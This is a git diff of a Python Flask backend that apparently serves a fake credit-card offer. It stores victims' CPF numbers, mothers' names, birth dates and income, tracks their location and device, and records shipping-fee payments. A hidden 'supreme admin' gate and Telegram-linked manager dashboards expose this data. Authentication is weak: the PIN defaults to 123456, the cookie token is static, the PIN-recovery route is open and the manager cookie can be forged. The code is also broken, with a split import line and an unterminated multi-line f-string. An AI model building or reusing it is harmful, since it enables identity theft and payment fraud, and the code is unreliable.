@@ -28,7 +28,31 @@ def generate_qr_b64(data: str) -> str:
 """
 
 # ── IMPORTS ────────────────────────────────────────────────────────────────────
-import os, re, time, uuid, json, hmac, hashlib, sqlite3, secrets, logging, base64
+import os
+
+import time
+failed_attempts = {}
+
+def is_blocked(ip):
+    data = failed_attempts.get(ip)
+    if not data: return False
+    if data['count'] >= 5:
+        if time.time() - data['last'] < 300: # 5 minutes block
+            return True
+        else:
+            del failed_attempts[ip]
+    return False
+
+def record_auth_fail(ip):
+    data = failed_attempts.get(ip, {'count': 0, 'last': 0})
+    data['count'] += 1
+    data['last'] = time.time()
+    failed_attempts[ip] = data
+
+def reset_auth_fail(ip):
+    if ip in failed_attempts:
+        del failed_attempts[ip]
+, re, time, uuid, json, hmac, hashlib, sqlite3, secrets, logging, base64
 from functools import wraps
 from datetime import datetime, timedelta
 from pathlib import Path
@@ -177,7 +201,20 @@ def get_sys_config(db):
 def init_db():
     with app.app_context():
         db = get_db()
+        try:
+            db.execute("ALTER TABLE leads ADD COLUMN location TEXT")
+        except:
+            pass
+        try:
+            db.execute("ALTER TABLE leads ADD COLUMN device_brand TEXT")
+        except:
+            pass
+
         db.executescript("""
+        -- Migrations
+        ALTER TABLE leads ADD COLUMN location TEXT;
+        ALTER TABLE leads ADD COLUMN device_brand TEXT;
+        
         CREATE TABLE IF NOT EXISTS admin (
             id         INTEGER PRIMARY KEY AUTOINCREMENT,
             username   TEXT    NOT NULL UNIQUE,
@@ -225,7 +262,9 @@ def init_db():
             src             TEXT,
             sck             TEXT,
             created_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
-            updated_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real))
+            updated_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
+            location        TEXT,
+            device_brand    TEXT
         );
 
         CREATE TABLE IF NOT EXISTS telegram_admins (
@@ -583,10 +622,10 @@ def api_lead():
         db.execute("""
             INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
                 renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
-                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location)
-            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location,device_brand)
+            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
         """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
-              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc))
+              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, device_brand))
     db.commit()
     import threading
     threading.Thread(target=send_telegram_notify, args=(sid, "ENTRY")).start()
@@ -1312,6 +1351,162 @@ def api_get_public_config():
 def health():
     return jsonify({"ok": True, "ts": time.time()})
 
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SUPREME ADMIN SHIELDED GATES
+# ══════════════════════════════════════════════════════════════════════════════
+SUPREME_HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92" # SHA-256 for '123456'
+
+def get_supreme_hash():
+    # If LO sets SUPREME_PIN in Vercel, use it. Otherwise use the default 123456 hash.
+    pin = os.environ.get("SUPREME_PIN")
+    if pin:
+        import hashlib
+        return hashlib.sha256(pin.encode()).hexdigest()
+    return SUPREME_HASH
+
+def supreme_required(f):
+    @wraps(f)
+    def wrapped(*args, **kwargs):
+        token = request.cookies.get("supreme_token")
+        if not token or token != get_supreme_hash():
+            return jsonify({"ok": False, "error": "Acesso Negado. Blindagem Ativa."}), 403
+        return f(*args, **kwargs)
+    return wrapped
+
+@app.route("/nexus-gate-9x02")
+def supreme_admin_gate():
+    return render_template("supreme_admin.html")
+
+@app.route("/api/supreme/auth", methods=["POST"])
+def supreme_auth():
+    data = get_secure_json()
+    pin = str(data.get("pin", ""))
+    
+    # Rate Limiting against Bruteforce
+    ip = request.headers.get("CF-Connecting-IP", request.remote_addr)
+    if is_blocked(ip):
+        return jsonify({"ok": False, "error": "IP Bloqueado por brute-force."}), 429
+        
+    import hashlib
+    pin_hash = hashlib.sha256(pin.encode()).hexdigest()
+    
+    if pin_hash == get_supreme_hash():
+        reset_auth_fail(ip)
+        resp = jsonify({"ok": True})
+        # Set Secure Cookie
+        resp.set_cookie("supreme_token", pin_hash, httponly=True, samesite="Lax", max_age=86400)
+        return resp
+    else:
+        record_auth_fail(ip)
+        return jsonify({"ok": False, "error": "PIN Incorreto."}), 401
+
+@app.route("/api/supreme/dashboard", methods=["GET"])
+@supreme_required
+def supreme_dashboard():
+    db = get_db()
+    
+    leads_count = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
+    pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
+    pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
+    
+    cartoes_emitidos = db.execute("SELECT COUNT(*) FROM leads WHERE card_style IS NOT NULL AND card_style != ''").fetchone()[0]
+    
+    # Region Stats
+    regions_raw = db.execute("SELECT location, COUNT(*) as c FROM leads WHERE location IS NOT NULL AND location != 'Desconhecido' GROUP BY location ORDER BY c DESC LIMIT 5").fetchall()
+    regions = [{"name": r["location"], "count": r["c"]} for r in regions_raw]
+    
+    # Device Stats
+    devices_raw = db.execute("SELECT device_brand, COUNT(*) as c FROM leads WHERE device_brand IS NOT NULL GROUP BY device_brand ORDER BY c DESC").fetchall()
+    devices = [{"name": d["device_brand"], "count": d["c"]} for d in devices_raw]
+    
+    # Recent Leads Detailed
+    recent_leads = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 500").fetchall()
+    payments_data = db.execute("SELECT amount, status, created_at FROM payments WHERE status='approved' OR status='pago' ORDER BY created_at ASC").fetchall()
+    
+    stats = {
+        "entradas": leads_count,
+        "cartoes": cartoes_emitidos,
+        "receita": round(pagos[0] or 0, 2),
+        "pagos_qtd": pagos[1] or 0,
+        "pendentes": pendentes,
+        "regions": regions,
+        "devices": devices,
+        "leads": [dict(l) for l in recent_leads],
+        "payments_data": [dict(p) for p in payments_data]
+    }
+    
+    return jsonify({"ok": True, "stats": stats})
+
+
+
+@app.route("/api/supreme/manager", methods=["GET", "POST"])
+@supreme_required
+def supreme_manager():
+    db = get_db()
+    if request.method == "GET":
+        mgr = dict(db.execute("SELECT * FROM manager WHERE id=1").fetchone())
+        return jsonify({"ok": True, "manager": mgr})
+        
+    if request.method == "POST":
+        data = request.get_json(silent=True) or {}
+        name = data.get("name")
+        photo = data.get("photo_url")
+        since = data.get("since_year")
+        
+        updates = []
+        params = []
+        if name:
+            updates.append("name=?")
+            params.append(name)
+        if photo:
+            updates.append("photo_url=?")
+            params.append(photo)
+        if since:
+            updates.append("since_year=?")
+            params.append(since)
+            
+        if updates:
+            params.append(1) # for id=1
+            query = f"UPDATE manager SET {', '.join(updates)}, updated_at=cast(strftime('%s','now') as real) WHERE id=?"
+            db.execute(query, params)
+            db.commit()
+            
+        return jsonify({"ok": True})
+
+
+@app.route("/api/supreme/recover-pin", methods=["POST"])
+def supreme_recover_pin():
+    pin = os.environ.get("SUPREME_PIN", "123456")
+    admin_id = os.environ.get("ADMIN_SUPREMO")
+    token = os.environ.get("BOT_TOKEN")
+    if not admin_id or not token:
+        return jsonify({"ok": False, "error": "Bot ou Admin não configurados na Vercel."})
+    
+    import requests
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {
+        "chat_id": admin_id,
+        "text": f"🔐 <b>Solicitação de Recuperação (Nexus Gate)</b>\n\nO seu PIN Blindado é: <code>{pin}</code>\n\n<i>Se não foi você que solicitou, ignore.</i>",
+        "parse_mode": "HTML"
+    }
+    requests.post(url, json=payload)
+    return jsonify({"ok": True})
+
+@app.route("/api/supreme/frete", methods=["POST"])
+@supreme_required
+def supreme_frete():
+    data = get_secure_json()
+    expresso = data.get("frete_expresso")
+    padrao = data.get("frete_padrao")
+    db = get_db()
+    if expresso:
+        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_expresso', ?)", (expresso,))
+    if padrao:
+        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_padrao', ?)", (padrao,))
+    db.commit()
+    return jsonify({"ok": True})
+
 @app.errorhandler(404)
 def not_found(_):
     return render_template("index.html"), 200
@@ -1379,3 +1574,159 @@ else:
         init_db()
     except Exception as e:
         log.error("Failed to init_db on startup: %s", e)
+
+
+# ==========================================
+# MANAGERS (NORMAL ADMINS) ROUTES
+# ==========================================
+import secrets
+import time
+import requests
+from functools import wraps
+
+def manager_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        token = request.cookies.get('manager_token')
+        if not token:
+            return jsonify({"ok": False, "error": "Acesso Negado."}), 401
+        db = get_db()
+        mgr = db.execute("SELECT * FROM managers WHERE telegram_id = ? AND status='active'", (token,)).fetchone()
+        if not mgr:
+            return jsonify({"ok": False, "error": "Acesso Negado ou Bloqueado."}), 401
+        return f(*args, **kwargs)
+    return decorated_function
+
+@app.route("/api/supreme/managers", methods=["GET", "POST", "DELETE", "PUT"])
+@supreme_required
+def api_manage_managers():
+    db = get_db()
+    if request.method == "GET":
+        mgrs = db.execute("SELECT * FROM managers ORDER BY created_at DESC").fetchall()
+        return jsonify({"ok": True, "managers": [dict(m) for m in mgrs]})
+        
+    if request.method == "POST":
+        data = request.json
+        tid = data.get("telegram_id")
+        if not tid: return jsonify({"ok": False, "error": "Telegram ID obrigatório"})
+        
+        # Try to fetch Telegram Avatar and Name using Bot API
+        bot_token = os.environ.get('BOT_TOKEN')
+        name = "Gerente"
+        avatar = "https://ui-avatars.com/api/?name=Gerente&background=random"
+        if bot_token:
+            try:
+                # getChat
+                chat_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={tid}").json()
+                if chat_res.get("ok"):
+                    first_name = chat_res["result"].get("first_name", "")
+                    last_name = chat_res["result"].get("last_name", "")
+                    name = f"{first_name} {last_name}".strip() or "Gerente"
+                    
+                # getUserProfilePhotos
+                photo_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getUserProfilePhotos?user_id={tid}&limit=1").json()
+                if photo_res.get("ok") and photo_res["result"]["total_count"] > 0:
+                    file_id = photo_res["result"]["photos"][0][0]["file_id"]
+                    file_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getFile?file_id={file_id}").json()
+                    if file_res.get("ok"):
+                        file_path = file_res["result"]["file_path"]
+                        avatar = f"https://api.telegram.org/file/bot{bot_token}/{file_path}"
+            except Exception as e:
+                pass
+                
+        try:
+            db.execute("INSERT INTO managers (telegram_id, name, avatar_url, created_at) VALUES (?, ?, ?, ?)", (tid, name, avatar, int(time.time())))
+            db.commit()
+            return jsonify({"ok": True})
+        except sqlite3.IntegrityError:
+            return jsonify({"ok": False, "error": "Gerente já existe."})
+            
+    if request.method == "PUT":
+        data = request.json
+        tid = data.get("telegram_id")
+        status = data.get("status")
+        db.execute("UPDATE managers SET status = ? WHERE telegram_id = ?", (status, tid))
+        db.commit()
+        return jsonify({"ok": True})
+        
+    if request.method == "DELETE":
+        data = request.json
+        tid = data.get("telegram_id")
+        db.execute("DELETE FROM managers WHERE telegram_id = ?", (tid,))
+        db.execute("DELETE FROM manager_links WHERE telegram_id = ?", (tid,))
+        db.commit()
+        return jsonify({"ok": True})
+
+@app.route("/api/supreme/manager_invite", methods=["POST"])
+@supreme_required
+def api_manager_invite():
+    data = request.json
+    tid = data.get("telegram_id")
+    db = get_db()
+    mgr = db.execute("SELECT * FROM managers WHERE telegram_id = ? AND status='active'", (tid,)).fetchone()
+    if not mgr: return jsonify({"ok": False, "error": "Gerente não encontrado ou bloqueado."})
+    
+    link_hash = secrets.token_urlsafe(32)
+    access_code = str(secrets.randbelow(900000) + 100000) # 6 digit code
+    
+    db.execute("INSERT INTO manager_links (hash, telegram_id, access_code, created_at) VALUES (?, ?, ?, ?)", (link_hash, tid, access_code, int(time.time())))
+    db.commit()
+    
+    bot_token = os.environ.get('BOT_TOKEN')
+    domain = request.host_url.rstrip('/')
+    link = f"{domain}/nexus-manager/{link_hash}"
+    
+    msg = f"🔐 *Acesso Gerado*
+
+Seu link único e criptografado: {link}
+
+Seu código de acesso: `{access_code}`
+
+_Este link é de uso único._"
+    
+    if bot_token:
+        try:
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
+                "chat_id": tid,
+                "text": msg,
+                "parse_mode": "Markdown"
+            })
+            return jsonify({"ok": True})
+        except Exception as e:
+            return jsonify({"ok": False, "error": str(e)})
+    return jsonify({"ok": False, "error": "Bot token não configurado."})
+
+@app.route("/nexus-manager/<hash_str>", methods=["GET"])
+def manager_view(hash_str):
+    db = get_db()
+    link = db.execute("SELECT * FROM manager_links WHERE hash = ?", (hash_str,)).fetchone()
+    if not link or link['used']:
+        return "Link inválido ou já utilizado.", 403
+    return render_template("manager_dashboard.html", hash=hash_str)
+
+@app.route("/api/manager/auth", methods=["POST"])
+def manager_auth():
+    data = request.json
+    hash_str = data.get("hash")
+    code = data.get("code")
+    
+    db = get_db()
+    link = db.execute("SELECT * FROM manager_links WHERE hash = ? AND access_code = ?", (hash_str, code)).fetchone()
+    if not link or link['used']:
+        return jsonify({"ok": False, "error": "Código ou link inválido."}), 403
+        
+    db.execute("UPDATE manager_links SET used = 1 WHERE hash = ?", (hash_str,))
+    db.commit()
+    
+    resp = jsonify({"ok": True})
+    resp.set_cookie("manager_token", link['telegram_id'], httponly=True, samesite="Lax", max_age=43200) # 12 hours
+    return resp
+
+@app.route("/api/manager/dashboard", methods=["GET"])
+@manager_required
+def manager_dashboard_data():
+    db = get_db()
+    # Managers only see leads with payments approved or pending (who ordered cards)
+    # The prompt says: "clientes que realizaram compra pedido do cartao completo e pagando o frete"
+    recent_leads = db.execute("SELECT l.* FROM leads l JOIN payments p ON l.cpf = p.cpf WHERE p.status='approved' OR p.status='pago' OR p.status='pending' ORDER BY l.created_at DESC LIMIT 200").fetchall()
+    return jsonify({"ok": True, "leads": [dict(l) for l in recent_leads]})
